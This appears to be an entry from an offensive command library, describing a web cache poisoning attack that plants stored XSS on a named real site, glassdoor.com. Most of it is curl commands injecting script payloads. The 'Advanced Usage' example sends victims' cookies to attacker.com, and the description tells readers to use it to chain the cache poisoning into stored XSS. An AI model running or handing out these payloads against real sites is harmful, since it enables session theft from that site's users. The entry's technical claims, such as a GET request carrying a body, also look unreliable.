---
id: c-cache-poisoning-xss
data: >-
  curl -X GET
  "https://www.glassdoor.com/member/home/index.htm/x.jpeg?t=2021111121" -H
  "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -d
  "<script>alert(document.cookie)</script>" -v
tags:
  - xss
  - cache-poisoning
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:56:03.736Z'
verified: false
validated: true
submitted: true
---
# cache-poisoning-xss-payload

## Command

```bash
curl -X GET "https://www.glassdoor.com/member/home/index.htm/x.jpeg?t=2021111121" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -d "<script>alert(document.cookie)</script>" -v
```

## Description

This command poisons the cache with an XSS payload by sending a GET request to a URL with .jpeg extension, injecting script via POST data. Use to chain cache poisoning to stored XSS on web apps like Glassdoor.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP method (despite -d, simulates GET with body) | Yes |
| `URL` | Path with .jpeg and timestamp t parameter | Yes |
| `-H User-Agent` | Browser mimicry | Yes |
| `-d` | Payload data (e.g., <script> tag) | Yes |
| `-v` | Verbose for response inspection | Yes |
| `t` | Timestamp for cache targeting (e.g., 2021111121) | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.glassdoor.com/member/home/index.htm/x.jpeg?t=2021111121" -H "User-Agent: Mozilla/5.0" -d "<script>alert('XSS')</script>" -v
```

### Advanced Usage

```bash
curl -X GET "https://www.glassdoor.com/member/home/index.htm/x.jpeg?t=2021111121" -H "User-Agent: Mozilla/5.0" -H "Content-Type: text/plain" -d "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>" -v
```

## Expected Output

200 OK with the response body including the injected script. When served from cache to a victim, the browser executes the JavaScript, e.g., alerting cookies or exfiltrating data.

## Related

- [[Related Procedure: Chain-Web-Cache-Poisoning-to-Stored-XSS]]
